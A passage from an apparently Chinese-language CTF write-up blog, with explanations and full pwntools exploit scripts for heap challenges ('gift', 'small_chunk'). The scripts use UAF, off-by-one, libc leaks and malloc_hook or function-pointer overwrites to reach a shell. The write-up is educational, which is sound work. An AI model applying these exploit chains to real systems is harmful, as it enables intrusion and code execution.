class="line">one_gadget = libc_base + <span class="number">0xe6c81</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">write(calloc_got, one_gadget &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>2.gift：这道题目我认栽，确实是做题经验少了，忘了利用chunk头+chunk联合fastbin的FILO原则来修改chunk头了。</p>
<p>(1)改chunk头，加上UAF漏洞，利用chunk头里的函数指针和参数，改成printf，直接格式化字符串泄露地址。</p>
<p>(2)同样道理，直接改函数指针指向堆上伪造的system_addr，利用参数/bin/sh直接getshell。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./GIFT&quot;</span></span><br><span class="line">libc_file = <span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="comment">#32bit:malloc_hook = main_arena-0x18</span></span><br><span class="line"><span class="comment">#32bit:main_arena+56(unsortedbin_addr)</span></span><br><span class="line"><span class="comment">#64bit:main_arena+96(unsortedbin_addr)//88 aslo have</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;) #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process(binary, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;49153&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt; &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, con</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;\x00&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">&quot;\x01&quot;</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">&quot;%8$p%9$p&quot;</span>+<span class="string">&quot;\x30&quot;</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x55810</span></span><br><span class="line"><span class="comment"># li(&quot;libc_base&quot;, libc_base)</span></span><br><span class="line"><span class="comment"># li(&quot;leak&quot;, leak)</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:0x%x&quot;</span>%heap_base)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">&quot;\x03&quot;</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">&quot;\x04&quot;</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x48</span>,p64(system_addr))<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">heap_system = heap_base+<span class="number">0x50</span>+<span class="number">0x50</span>+<span class="number">0x60</span>+<span class="number">0x60</span>+<span class="number">0x20</span>+<span class="number">0x10</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(heap_system)) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>3.small_chunk：我觉得出得最好的是这道题，确实不错。</p>
<p>(1)首先布局，利用off-by-one制作堆块重叠，然后unsortedbin泄露地址。</p>
<p>(2)由于chunk只能申请0x20和0x30，所以想要打fastbin attack，一般有以下三种方案来绕过：</p>
<p>①调用malloc_consolidate，整理fastbin中的chunk，使得fake_chunk的size变成合法的。这个有三种情况，具体分析，我都尝试了个遍，这里一个也用不了。</p>
<p>②利用unsotedbin attack，不过这个只能针对0x7f的情况，这里不太行。</p>
<p>③利用fastbinY链表，先伪造一个fastbin_chunk的fd为0x21或者0x31，申请回来fastbin_chunk，将0x21或者0x31留到fastbinY链表中，这样在main_arena中就留下了一个0x21或者0x31的数值，就可以利用这个数值伪造size来申请chunk到main_arena。之后0x20和0x30的fastbin打配合，将top_chunk地址改成malloc_hook的地方，再申请就可以申请到malloc_hook了。</p>
<p>需要注意的是，top_chunk改地址，需要绕过一些检测，所以一般两种情况：</p>
<p>A.free_hook-0xb58</p>
<p>B.malloc_hook-0x10</p>
<p>以上两种的size域都是一个libc地址，能够通过检测</p>
<p>这里由于堆块个数不够用，所以选择方案B，修改完malloc_hook为one_gadget后，再申请即可getshell。</p>
<p>▲这里在后面的复现中有点犯蠢，本来想申请到bss段上的，没办法泄露elf基地址。vmmap一看，发现heap_base和bss段固定偏移0x1000，这可给我高兴坏了，直接打bss段的size区域的地方。打完后，关机之后，再打开发现不顶用了。得，ASLR我之前给关了，再开就不是固定偏移了…..</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./small_chunk&quot;</span></span><br><span class="line">libc_file = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span></span><br><span class="line"><span class="comment">#libc_file = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="comment">#32bit:malloc_hook = main_arena-0x18</span></span><br><span class="line"><span class="comment">#32bit:main_arena+56(unsortedbin_addr)</span></span><br><span class="line"><span class="comment">#64bit:main_arena+96(unsortedbin_addr)//88 aslo have</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;) #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="string">system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#usually gadget:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">u_gadget1 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x5a</span></span><br><span class="line"><span class="string">u_gadget2 = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x40</span></span><br><span class="line"><span class="string">pop_rdi_ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x63</span></span><br><span class="line"><span class="string">ret = elf.sym[&#x27;__libc_csu_init&#x27;] + 0x64</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(binary)</span></span><br><span class="line">    p = process(binary, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;49153&quot;</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    libc = ELF(libc_file)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;&gt;&gt; &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, con</span>):</span></span><br><span class="line">    sla(menu, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;content: &quot;</span>,con)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">heap_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x20</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:%x&quot;</span>%heap_base)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">chunk2_addr = heap_base+<span class="number">0x40</span></span><br><span class="line">log.info(<span class="string">&quot;chunk2_addr:%x&quot;</span>%chunk2_addr)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#idx2</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#idx3</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#idx5</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#idx6</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#idx7</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#idx8</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#idx9</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#idx10</span></span><br><span class="line">edit(<span class="number">2</span>,</span><br><span class="line">p64(<span class="number">0x0</span>)+p64(<span class="number">0x81</span>) <span class="comment">#fakechunk.pre_size,fakechunk.size</span></span><br><span class="line">+p64(chunk2_addr+<span class="number">0x10</span>)+p64(chunk2_addr+<span class="number">0x10</span>) <span class="comment">#fakechunk.fd,fakechunk.bk</span></span><br><span class="line">+p64(<span class="number">0x80</span>)+p64(<span class="number">0x31</span>)) <span class="comment">#chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10</span></span><br><span class="line"><span class="comment">#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0x0</span>)*<span class="number">4</span>+p64(<span class="number">0x80</span>)+p64(<span class="number">0xb0</span>)) <span class="comment">#chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10</span></span><br><span class="line"><span class="comment">#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#5</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">rc(<span class="number">0x10</span>)</span><br><span class="line">main_arena = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">88</span> -<span class="number">0x100</span>-<span class="number">0x20</span></span><br><span class="line">malloc_hook = main_arena-<span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:0x%x&quot;</span>%libc_base)</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>] <span class="comment">#system</span></span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">malloc_hook_addr = libc_base +libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">top_addr_main = main_arena+<span class="number">88</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1247</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;free_hook_addr:0x%x&quot;</span>%free_hook_addr)</span><br><span class="line">log.info(<span class="string">&quot;system_addr:0x%x&quot;</span>%system_addr)</span><br><span class="line">log.info(<span class="string">&quot;main_arena:0x%x&quot;</span>%main_arena)</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook_addr:0x%x&quot;</span>%malloc_hook_addr)</span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#11</span></span><br><span class="line">edit(<span class="number">11</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#14</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#15</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#7</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">12</span>,p64(main_arena))</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#16</span></span><br><span class="line">edit(<span class="number">16</span>,p64(main_arena+<span class="number">0x30</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">+p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#17</span></span><br><span class="line">edit(<span class="number">17</span>,p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(malloc_hook_addr-<span class="number">0x10</span>))</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#18</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#19</span></span><br><span class="line">edit(<span class="number">19</span>,p64(one_gadget))</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

